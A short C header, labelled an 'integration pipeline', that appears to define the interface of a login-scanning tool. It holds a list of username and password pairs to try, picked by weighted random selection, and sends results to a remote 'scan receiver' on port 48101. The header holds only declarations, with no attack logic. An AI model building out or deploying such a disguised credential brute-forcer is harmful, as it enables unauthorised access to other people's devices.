/**
 * @file pipeline.h
 * @brief Integration pipeline interface
 */

#ifndef PIPELINE_H
#define PIPELINE_H

#include <stddef.h>
#include <stdint.h>

/**
 * Credential structure
 */
typedef struct {
  char username[64];
  char password[64];
  uint16_t weight; // For weighted random selection
} credential_t;

/**
 * Initialize the pipeline
 *
 * @param local_ip_str Local IP address for scanning
 * @param report_host Scan receiver hostname/IP
 * @param report_port Scan receiver port (default: 48101)
 * @param credentials Array of credentials to try
 * @param credential_count Number of credentials
 * @return 0 on success, -1 on error
 */
int pipeline_init(const char *local_ip_str, const char *report_host,
                  uint16_t report_port, credential_t *credentials,
                  size_t credential_count);

/**
 * Start the pipeline (blocks until stopped)
 *
 * @return 0 on success, -1 on error
 */
int pipeline_start(void);

/**
 * Stop the pipeline
 */
void pipeline_stop(void);

/**
 * Cleanup pipeline resources
 */
void pipeline_cleanup(void);

#endif // PIPELINE_H
